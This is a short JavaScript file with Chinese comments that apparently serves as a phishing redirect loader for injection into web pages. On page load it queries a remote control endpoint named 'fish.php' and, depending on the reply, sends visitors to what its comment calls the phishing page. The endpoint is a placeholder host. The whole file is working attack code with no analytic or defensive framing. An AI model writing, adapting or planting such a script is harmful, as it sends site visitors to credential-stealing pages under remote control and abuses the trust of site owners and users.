window.onload = function () {
  var url = "http://domain/fish.php"; //接口地址
  var xhr = createXHR();
  xhr.open("GET", url, false);
  xhr.send(null);
  var text = xhr.responseText; //获取接口结果
  if (text == "NO") {
    window.location.href = "https://www.baidu.com/"; //这里是钓鱼页面的地址
  } else {
    console.log("Succ");
  }
};

function createXHR() {
  var XHR = [
    function () {
      return new XMLHttpRequest();
    },
    function () {
      return new ActiveXObject("Msxml2.XMLHTTP");
    },
    function () {
      return new ActiveXObject("Msxml3.XMLHTTP");
    },
    function () {
      return new ActiveXObject("Microsoft.XMLHTTP");
    }
  ];
  var xhr = null;
  for (var i = 0; i < XHR.length; i++) {
    try {
      xhr = XHR[i]();
    } catch (e) {
      continue;
    }
    break;
  }
  return xhr;
}
